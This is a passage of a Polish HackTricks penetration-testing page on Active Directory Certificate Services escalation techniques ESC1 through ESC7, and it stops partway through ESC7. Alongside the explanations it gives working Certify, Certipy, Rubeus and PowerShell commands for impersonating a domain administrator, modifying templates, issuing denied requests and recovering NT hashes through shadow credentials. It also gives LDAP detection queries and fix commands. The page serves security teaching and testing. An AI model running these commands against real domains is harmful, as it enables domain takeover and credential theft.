# Eskalacja uprawnień w domenie AD CS

{{#include ../../../banners/hacktricks-training.md}}


**To podsumowanie sekcji dotyczących technik eskalacji uprawnień z wpisów:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Błędnie skonfigurowane szablony certyfikatów - ESC1

### Wyjaśnienie

### Wyjaśnienie ESC1: błędnie skonfigurowane szablony certyfikatów

- **Enterprise CA przyznaje użytkownikom z niskimi uprawnieniami prawo do rejestrowania certyfikatów.**
- **Zatwierdzenie przez menedżera nie jest wymagane.**
- **Nie są wymagane podpisy upoważnionego personelu.**
- **Deskryptory zabezpieczeń szablonów certyfikatów są zbyt liberalne, co pozwala użytkownikom z niskimi uprawnieniami uzyskać prawo do rejestrowania certyfikatów.**
- **Szablony certyfikatów są skonfigurowane tak, aby definiować EKU ułatwiające uwierzytelnianie:**
  - Uwzględnione są identyfikatory Extended Key Usage (EKU), takie jak Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) lub brak EKU (SubCA).
- **Szablon zezwala wnioskującym na umieszczenie subjectAltName w żądaniu Certificate Signing Request (CSR):**
  - Jeśli w certyfikacie znajduje się subjectAltName (SAN), usługa Active Directory (AD) traktuje go priorytetowo podczas weryfikacji tożsamości. Oznacza to, że podając SAN w CSR, można zażądać certyfikatu umożliwiającego podszycie się pod dowolnego użytkownika (np. administratora domeny). Możliwość podania SAN przez wnioskującego określa właściwość `mspki-certificate-name-flag` obiektu szablonu certyfikatu w AD. Ta właściwość jest maską bitową, a obecność flagi `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` pozwala wnioskującemu podać SAN.

> [!CAUTION]
> Te ustawienia wskazują potencjalnie podatny szablon ESC1, ale nie potwierdzają, że istnieje kompletna ścieżka podszycia się pod użytkownika. Sprawdź, czy dany podmiot może zarejestrować certyfikat w CA publikującym ten szablon, czy rejestrowanie certyfikatów przez CA jest dozwolone oraz czy wydany certyfikat spełnia wymagania dotyczące silnego mapowania SID na punkcie końcowym uwierzytelniania. Aktualne, załatane KDC mogą odrzucić żądany UPN, jeśli SID certyfikatu nie pasuje do celu; zobacz [wskazówki firmy Microsoft dotyczące mapowania certyfikatów](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Prawo do rejestrowania certyfikatów przyznane **Domain Computers** może sprawić, że przygotowana tożsamość komputera będzie mogła zarejestrować certyfikat, nawet jeśli pierwotny użytkownik nie ma takiej możliwości. Osobno oceń uprawnienia podmiotu komputera. Przed wysłaniem żądania sprawdź `msPKI-Minimal-Key-Size`: szablon wymagający kluczy RSA o długości 4096 bitów odrzuci domyślny klucz klienta o długości 2048 bitów. SID celu podany w żądaniu może rozwiązać problem niezgodności SID tylko wtedy, gdy CA i KDC akceptują wynikowy certyfikat i mapowanie; same flagi szablonu ani wpis ACE z prawem Enroll nie są tego dowodem.

Ta funkcja bywa włączana w celu obsługi dynamicznego generowania certyfikatów HTTPS lub certyfikatów hosta przez produkty albo usługi wdrożeniowe, a także z powodu braku wiedzy.

Warto zauważyć, że utworzenie certyfikatu z użyciem tej opcji wywołuje ostrzeżenie. Nie dzieje się tak, gdy istniejący szablon certyfikatu (np. szablon `WebServer`, w którym włączono `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) zostanie skopiowany, a następnie zmodyfikowany w celu dodania OID uwierzytelniania.<sup>[[6]](#references)</sup>

### Nadużycie

Aby **znaleźć podatne szablony certyfikatów**, możesz uruchomić:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Aby **wykorzystać tę podatność do podszycia się pod administratora**, można uruchomić:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Następnie możesz przekształcić wygenerowany **certyfikat do formatu `.pfx`** i użyć go do **ponownego uwierzytelnienia za pomocą Rubeus lub certipy**:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Pliki binarne systemu Windows „Certreq.exe” i „Certutil.exe” mogą służyć do wygenerowania PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Wyliczenie szablonów certyfikatów w schemacie konfiguracji lasu AD, w szczególności tych, które nie wymagają zatwierdzenia ani podpisów, mają EKU Client Authentication lub Smart Card Logon oraz włączoną flagę `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, można przeprowadzić, uruchamiając następujące zapytanie LDAP:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Błędnie skonfigurowane szablony certyfikatów - ESC2

### Wyjaśnienie

Drugi scenariusz nadużycia jest wariantem pierwszego:

1. Enterprise CA przyznaje użytkownikom o niskich uprawnieniach prawo do rejestracji.
2. Wymóg zatwierdzenia przez menedżera jest wyłączony.
3. Pominięto wymóg autoryzowanych podpisów.
4. Zbyt permisywny deskryptor zabezpieczeń szablonu certyfikatu przyznaje użytkownikom o niskich uprawnieniach prawo do rejestracji certyfikatów.
5. **Szablon certyfikatu skonfigurowano tak, aby zawierał EKU Any Purpose lub nie zawierał żadnego EKU.**

EKU **Any Purpose** pozwala atakującemu uzyskać certyfikat **do dowolnego celu**, w tym uwierzytelniania klienta, uwierzytelniania serwera, podpisywania kodu itp. Do wykorzystania tego scenariusza można zastosować tę samą **technikę co w przypadku ESC3**.

Certyfikaty **bez EKU**, które działają jak certyfikaty podrzędnego CA, można wykorzystać **do dowolnego celu** i **podpisywać nimi nowe certyfikaty**. Atakujący może więc określić dowolne EKU lub pola w nowych certyfikatach, używając certyfikatu podrzędnego CA.

Nowe certyfikaty utworzone na potrzeby **uwierzytelniania w domenie** nie będą jednak działać, jeśli podrzędny urząd certyfikacji nie jest zaufany przez obiekt **`NTAuthCertificates`**, co jest ustawieniem domyślnym. Atakujący nadal może jednak tworzyć **nowe certyfikaty z dowolnym EKU** i dowolnymi wartościami certyfikatu. Mogą one zostać potencjalnie **wykorzystane** do wielu celów (np. podpisywania kodu, uwierzytelniania serwera itp.) i mieć istotne konsekwencje dla innych aplikacji w sieci, takich jak SAML, AD FS czy IPSec.<sup>[[6]](#references)</sup>

Aby wyliczyć szablony pasujące do tego scenariusza w schemacie konfiguracji lasu AD, można uruchomić następujące zapytanie LDAP:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Nieprawidłowo skonfigurowane szablony agenta rejestracji - ESC3

### Wyjaśnienie

Ten scenariusz przypomina pierwszy i drugi, ale polega na **nadużyciu** **innego EKU** (Certificate Request Agent) i **2 różnych szablonów** (a zatem obowiązują 2 zestawy wymagań).

**EKU Certificate Request Agent** (OID 1.3.6.1.4.1.311.20.2.1), nazywane w dokumentacji Microsoft **Enrollment Agent**, umożliwia podmiotowi **uzyskanie** **certyfikatu** **w imieniu innego użytkownika**.

**„Enrollment agent”** uzyskuje certyfikat z takiego **szablonu** i używa go do **współpodpisania CSR w imieniu innego użytkownika**. Następnie **przesyła** **współpodpisany CSR** do CA, uzyskując certyfikat z **szablonu**, który **zezwala na „enroll on behalf of”**. CA odsyła wówczas **certyfikat należący do „innego” użytkownika**.<sup>[[6]](#references)</sup>

**Wymagania 1:**

- Enterprise CA przyznaje użytkownikom o niskich uprawnieniach prawa do uzyskiwania certyfikatów.
- Pominięto wymóg zatwierdzenia przez przełożonego.
- Nie ma wymogu autoryzowanych podpisów.
- Deskryptor zabezpieczeń szablonu certyfikatu jest nadmiernie liberalny i przyznaje użytkownikom o niskich uprawnieniach prawa do uzyskiwania certyfikatów.
- Szablon certyfikatu zawiera EKU Certificate Request Agent, umożliwiające żądanie certyfikatów z innych szablonów w imieniu innych podmiotów.

**Wymagania 2:**

- Enterprise CA przyznaje użytkownikom o niskich uprawnieniach prawa do uzyskiwania certyfikatów.
- Zatwierdzenie przez przełożonego jest pomijane.
- Docelowy szablon wersji 1 może akceptować enrollment agent bez nowszych, szczegółowych mechanizmów kontroli zasad wydawania; w przypadku wersji 2 lub nowszej należy ocenić wymagania dotyczące zasad wydawania dla application-policy oraz autoryzowane podpisy, zamiast wykluczać szablon wyłącznie ze względu na jego wersję.
- EKU zdefiniowane w szablonie certyfikatu zezwala na uwierzytelnianie w domenie.
- CA nie stosuje ograniczeń dotyczących enrollment agentów.

Docelowy szablon musi być również opublikowany przez wybrany CA, zezwalać docelowemu kontu na uzyskiwanie certyfikatów i obsługiwać zamierzone zastosowanie do uwierzytelniania w domenie. Sprawdź wymagane atrybuty subject/SAN dla tego konta; na przykład szablon, który tworzy subject na podstawie adresu e-mail z AD, nie może wydać certyfikatu dla konta bez wymaganej wartości `mail`. Sam certyfikat agenta nie spełnia tych wymagań dotyczących docelowego szablonu.

### Nadużycie

Do nadużycia tego scenariusza możesz użyć [**Certify**](https://github.com/GhostPack/Certify) lub [**Certipy**](https://github.com/ly4k/Certipy):<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

Użytkownicy, którym wolno **uzyskać** **certyfikat agenta rejestracji**, szablony, w których agenci rejestracji mogą rejestrować certyfikaty, oraz **konta**, w imieniu których agent rejestracji może działać, mogą być ograniczane przez urzędy certyfikacji przedsiębiorstwa. Można to zrobić, otwierając przystawkę `certsrc.msc`, **klikając prawym przyciskiem myszy urząd certyfikacji**, **wybierając Properties**, a następnie **przechodząc** do zakładki „Enrollment Agents”.

Należy jednak zauważyć, że domyślnym ustawieniem urzędów certyfikacji jest „**Do not restrict enrollment agents**”. Gdy administratorzy włączą ograniczenia dotyczące agentów rejestracji, wybierając opcję „Restrict enrollment agents”, domyślna konfiguracja nadal pozostaje niezwykle permisywna. Umożliwia ona **Everyone** rejestrowanie certyfikatów we wszystkich szablonach, w imieniu dowolnej osoby.

### Windows-only PowerShell PoCs z Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) wykorzystuje ESC1 i ESC2/ESC3 bez Certify ani Certipy. Jego skrypty tworzą eksportowalny klucz RSA o długości 2048 bitów za pomocą interfejsu COM `X509Enrollment`, budują żądanie PKCS#10, odnajdują przez LDAP pierwszy `pKIEnrollmentService`, przesyłają żądanie za pomocą `CertificateAuthority.Request`, instalują odpowiedź w `Cert:\CurrentUser\My` i eksportują plik PFX zakodowany w Base64. Skrypt ESC1 dodaje wybrany przez atakującego UPN SAN (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, wartość `0xb`), natomiast skrypty ESC2/ESC3 używają pierwszego certyfikatu do podpisania żądania PKCS#7 w imieniu innej osoby.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Skrypty wypisują Base64 pliku **PFX**, który zawiera klucz prywatny, aby można go było bezpośrednio użyć z Rubeus. Nie zastępuj go przez `[Convert]::ToBase64String($cert.RawData)`: `RawData` koduje wyłącznie certyfikat publiczny i nie może podpisać żądania PKINIT.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Kontrola dostępu do podatnego szablonu certyfikatu - ESC4

### **Wyjaśnienie**

**Deskryptor zabezpieczeń** **szablonów certyfikatów** określa **uprawnienia**, jakie poszczególne **podmioty AD** mają w odniesieniu do szablonu.

Jeśli **atakujący** ma wymagane **uprawnienia**, by **zmienić** **szablon** i **wprowadzić** dowolne **podatne błędne konfiguracje** opisane w **poprzednich sekcjach**, może to ułatwić eskalację uprawnień.

Do istotnych uprawnień dotyczących szablonów certyfikatów należą:<sup>[[6]](#references)</sup>

- **Owner:** Zapewnia niejawne uprawnienia do zarządzania obiektem, umożliwiając modyfikację dowolnych atrybutów.
- **FullControl:** Zapewnia pełną kontrolę nad obiektem, w tym możliwość zmiany dowolnych atrybutów.
- **WriteOwner:** Pozwala zmienić właściciela obiektu na podmiot kontrolowany przez atakującego.
- **WriteDacl:** Pozwala zmieniać mechanizmy kontroli dostępu, potencjalnie przyznając atakującemu uprawnienie FullControl.
- **WriteProperty:** Pozwala edytować dowolne właściwości obiektu.

Sprawdź również DACL kontenera `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. Odpowiedni ACE `CreateChild` ograniczony do klasy [`pKICertificateTemplate`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c) lub szerokie uprawnienia do pełnej kontroli mogą pozwolić na utworzenie nowego obiektu szablonu. [Dokumentacja Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) informuje, że kontener przechowuje te obiekty szablonów. Przed stwierdzeniem, czy utworzenie obiektu jest możliwe, sprawdź pasujące ACE typu deny oraz dziedziczenie uprawnień. Samo utworzenie szablonu nie powoduje wydania certyfikatu: CA musi go opublikować, podmiot żądający musi mieć uprawnienia do rejestracji, a certyfikat musi być mapowany na zamierzoną tożsamość w punkcie końcowym uwierzytelniania.

### Nadużycie

Aby zidentyfikować podmioty mające uprawnienia do edycji szablonów i innych obiektów PKI, przeprowadź enumerację za pomocą Certify:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Przykład privesc podobnego do poprzedniego:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 występuje wtedy, gdy użytkownik ma uprawnienia do zapisu w szablonie certyfikatu. Można to na przykład wykorzystać do nadpisania konfiguracji szablonu certyfikatu, aby stał się podatny na ESC1.

Szablon, który już pozwala podmiotowi żądającemu podać temat certyfikatu, ale umożliwia wyłącznie uwierzytelnianie serwera, sam w sobie nie służy do logowania użytkowników. Mając efektywne uprawnienia do kontroli szablonu, atakujący może zmienić jego EKU uwierzytelniania lub zasady aplikacji przed złożeniem żądania certyfikatu; [Microsoft opisuje przeznaczenie EKU Smartcard Logon do logowania](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Sprawdź, czy CA publikuje zmodyfikowany szablon, czy wnioskodawca może się zapisać, czy spełnione są wymagania dotyczące zatwierdzenia/podpisu oraz czy wystawiony certyfikat jest mapowany na właściwe konto. W szczególności [załatane kontrolery domeny działające w trybie Full Enforcement](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) odrzucają certyfikaty bez silnego mapowania; dodanie docelowego UPN do żądania nie omija tego wymogu.

Jak widać na powyższej ścieżce, tylko `JOHNPC` ma te uprawnienia, ale nasz użytkownik `JOHN` ma nową krawędź `AddKeyCredentialLink` do `JOHNPC`. Ponieważ ta technika jest powiązana z certyfikatami, zaimplementowałem również ten atak, znany jako [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Oto krótki przedsmak działania polecenia `shadow auto` w Certipy, które pozwala odzyskać hash NT ofiary.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** może nadpisać konfigurację szablonu certyfikatu za pomocą pojedynczego polecenia. **Domyślnie** Certipy **nadpisze** konfigurację, aby uczynić ją **podatną na ESC1**. Możemy również określić **parametr `-save-old`, aby zapisać starą konfigurację**, co przyda się do **przywrócenia** konfiguracji po naszym ataku.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Kontrola dostępu do podatnych obiektów PKI - ESC5

### Wyjaśnienie

Rozbudowana sieć powiązań opartych na ACL, obejmująca wiele obiektów wykraczających poza szablony certyfikatów i urząd certyfikacji, może wpływać na bezpieczeństwo całego systemu AD CS. Do obiektów, które mogą znacząco wpłynąć na bezpieczeństwo, należą:

- Obiekt komputera AD serwera CA, który może zostać przejęty za pomocą mechanizmów takich jak S4U2Self lub S4U2Proxy.
- Serwer RPC/DCOM serwera CA.
- Każdy podrzędny obiekt lub kontener AD w określonej ścieżce kontenera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ścieżka ta obejmuje między innymi kontenery i obiekty takie jak kontener Certificate Templates, kontener Certification Authorities, obiekt NTAuthCertificates i kontener Enrollment Services.

Bezpieczeństwo systemu PKI może zostać naruszone, jeśli atakujący o niskich uprawnieniach zdoła przejąć kontrolę nad dowolnym z tych krytycznych elementów.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Wyjaśnienie

Temat omówiony we [**wpisie CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) porusza również kwestię skutków użycia flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, opisanych przez Microsoft. To ustawienie, po włączeniu na urzędzie certyfikacji (CA), pozwala dodawać **wartości zdefiniowane przez użytkownika** do **alternatywnej nazwy podmiotu** w **dowolnym żądaniu**, także w żądaniach tworzonych na podstawie Active Directory®. W rezultacie **intruz** może uzyskać certyfikat za pośrednictwem **dowolnego szablonu** skonfigurowanego do **uwierzytelniania** w domenie — w szczególności takiego, który pozwala na rejestrowanie certyfikatów **nieuprzywilejowanym** użytkownikom, jak standardowy szablon User. Dzięki temu intruz może uzyskać certyfikat i uwierzytelnić się jako administrator domeny lub **dowolny inny aktywny podmiot** w domenie.<sup>[[9]](#references)</sup>

**Uwaga**: Sposób dodawania **alternatywnych nazw** do żądania podpisania certyfikatu (CSR) za pomocą argumentu `-attrib "SAN:"` w `certreq.exe` (określanego jako „Name Value Pairs”) **różni się** od metody wykorzystywania SAN w ESC1. Różnica polega na **sposobie zapisania informacji o koncie** — są one umieszczane w atrybucie certyfikatu, a nie w rozszerzeniu.

### Wykorzystanie

Aby sprawdzić, czy to ustawienie jest aktywne, organizacje mogą użyć następującego polecenia z `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Ta operacja zasadniczo wykorzystuje **zdalny dostęp do rejestru**, dlatego alternatywnym podejściem może być:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Narzędzia takie jak [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) potrafią wykryć tę błędną konfigurację i ją wykorzystać:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Aby zmienić te ustawienia, zakładając, że posiada się uprawnienia **administratora domeny** lub równoważne, można wykonać następujące polecenie na dowolnej stacji roboczej:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Aby wyłączyć tę konfigurację w swoim środowisku, można usunąć flagę za pomocą:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Po zastosowaniu aktualizacji zabezpieczeń z maja 2022 r. nowo wydane **certificates** będą zawierać **security extension**, która uwzględnia właściwość `objectSid` **requestera**. W przypadku ESC1 ten SID jest uzyskiwany z określonego SAN. Jednak w przypadku **ESC6** SID odzwierciedla właściwość `objectSid` **requestera**, a nie SAN.\
> Aby wykorzystać ESC6, system musi być podatny na ESC10 (Weak Certificate Mappings), które nadaje **SAN wyższy priorytet niż nowe security extension**.

## Kontrola dostępu do podatnego urzędu certyfikacji - ESC7

### Atak 1

#### Wyjaśnienie

Kontrola dostępu do urzędu certyfikacji jest realizowana za pomocą zestawu uprawnień regulujących działania CA. Uprawnienia te można wyświetlić, otwierając `certsrv.msc`, klikając prawym przyciskiem myszy CA, wybierając właściwości, a następnie przechodząc do karty Security. Uprawnienia można również wyliczyć za pomocą modułu PSPKI, używając poleceń takich jak:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

Zapewnia to wgląd w najważniejsze uprawnienia, czyli **`ManageCA`** i **`ManageCertificates`**, odpowiadające odpowiednio rolom „administratora CA” i „Menedżera certyfikatów”.<sup>[[6]](#references)</sup>

#### Nadużycie

Uprawnienie **`ManageCA`** w urzędzie certyfikacji pozwala podmiotowi zdalnie modyfikować jego ustawienia za pomocą PSPKI. Obejmuje to włączenie flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, która pozwala określać SAN w dowolnym szablonie — jest to kluczowy element eskalacji uprawnień w domenie.

Proces ten można uprościć za pomocą polecenia cmdlet **Enable-PolicyModuleFlag** z PSPKI, które umożliwia wprowadzanie zmian bez bezpośredniej interakcji z interfejsem GUI.

Posiadanie uprawnienia **`ManageCertificates`** umożliwia zatwierdzanie oczekujących żądań, skutecznie omijając zabezpieczenie „zatwierdzenie przez menedżera certyfikatów CA”.

Do zażądania, zatwierdzenia i pobrania certyfikatu można użyć połączenia modułów **Certify** i **PSPKI**:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Atak 2

#### Wyjaśnienie

> [!WARNING]
> W **poprzednim ataku** użyto uprawnień **`Manage CA`**, aby **włączyć** flagę **EDITF_ATTRIBUTESUBJECTALTNAME2** i przeprowadzić **atak ESC6**, ale nie przyniesie to żadnego efektu, dopóki usługa CA (`CertSvc`) nie zostanie ponownie uruchomiona. Użytkownik mający prawo dostępu `Manage CA` może również **ponownie uruchomić usługę**. Nie oznacza to jednak, że może zrobić to zdalnie. Ponadto E**SC6 może nie działać od razu** w większości załatanych środowisk ze względu na aktualizacje zabezpieczeń z maja 2022 r.

Dlatego przedstawiono tu inny atak.

Wymagania wstępne:

- Tylko uprawnienie **`ManageCA`**
- Uprawnienie **`Manage Certificates`** (można je przyznać za pomocą **`ManageCA`**)
- Szablon certyfikatu **`SubCA`** musi być **włączony** (można go włączyć za pomocą **`ManageCA`**)

Technika ta wykorzystuje fakt, że użytkownicy z prawami dostępu `Manage CA` _oraz_ `Manage Certificates` mogą **zatwierdzać nieudane żądania certyfikatów**. Szablon certyfikatu **`SubCA`** jest **podatny na ESC1**, ale **tylko administratorzy** mogą się na niego zapisywać. Użytkownik może więc **wysłać żądanie** zapisu do **`SubCA`** — które zostanie **odrzucone** — ale **później menedżer może je wystawić**.<sup>[[6]](#references)</sup>

#### Nadużycie

Możesz **przyznać sobie prawo dostępu `Manage Certificates`**, dodając swojego użytkownika jako nowego oficera.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

Szablon **`SubCA`** można **włączyć na CA** za pomocą parametru `-enable-template`. Domyślnie szablon `SubCA` jest włączony.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Jeśli spełniliśmy wymagania wstępne tego ataku, możemy rozpocząć od **złożenia wniosku o certyfikat na podstawie szablonu `SubCA`**.

**To żądanie zostanie odrzuco**ne, ale zapiszemy klucz prywatny i zanotujemy identyfikator żądania.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Mając uprawnienia **`Manage CA` i `Manage Certificates`**, możemy następnie **wystawić certyfikat dla nieudanego żądania** za pomocą polecenia `ca` i parametru `-issue-request <request ID>`.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

I na koniec możemy **pobrać wystawiony certyfikat** za pomocą polecenia `req` i parametru `-retrieve <request ID>`.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Atak 3 – Manage Certificates Extension Abuse (SetExtension)

#### Wyjaśnienie

Oprócz klasycznych nadużyć ESC7 (włączania atrybutów EDITF lub zatwierdzania oczekujących żądań) **Certify 2.0** ujawniło zupełnie nową możliwość, która wymaga jedynie roli *Manage Certificates* (inaczej **Certificate Manager / Officer**) na Enterprise CA.<sup>[[3]](#references)</sup>

Metodę RPC `ICertAdmin::SetExtension` może wywołać każdy podmiot posiadający uprawnienie *Manage Certificates*. Chociaż tradycyjnie metoda ta służyła legalnym CA do aktualizowania rozszerzeń oczekujących żądań, atakujący może ją wykorzystać do **dodania *niedomyślnego* rozszerzenia certyfikatu** (na przykład niestandardowego OID *Certificate Issuance Policy*, takiego jak `1.1.1.1`) do żądania oczekującego na zatwierdzenie.

